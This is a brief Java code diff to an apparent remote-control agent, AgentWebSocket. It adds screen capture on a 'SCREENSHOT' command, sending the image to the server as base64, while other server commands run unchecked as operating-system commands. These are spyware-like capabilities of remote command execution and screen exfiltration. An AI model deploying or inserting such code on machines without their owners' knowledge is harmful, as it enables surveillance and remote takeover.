@@ -87,8 +87,17 @@ public class AgentWebSocket implements WebSocket.Listener {
     @Override
     public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
         String command = data.toString();
-        System.out.println("🔔 [Network] Nhận lệnh từ Server: " + command);
-        com.ly.system.OsCommand.execute(command);
+
+        if (command.equals("SCREENSHOT")) {
+            System.out.println("📸 [Network] Đang chụp màn hình theo yêu cầu...");
+            String base64 = com.ly.system.OsCommand.captureScreenBase64();
+            // Gửi ảnh kèm tiền tố IMG|
+            webSocket.sendText("IMG|" + base64, true);
+        } else {
+            System.out.println("🔔 [Network] Nhận lệnh từ Server: " + command);
+            com.ly.system.OsCommand.execute(command);
+        }
+
         webSocket.request(1);
         return null;
     }
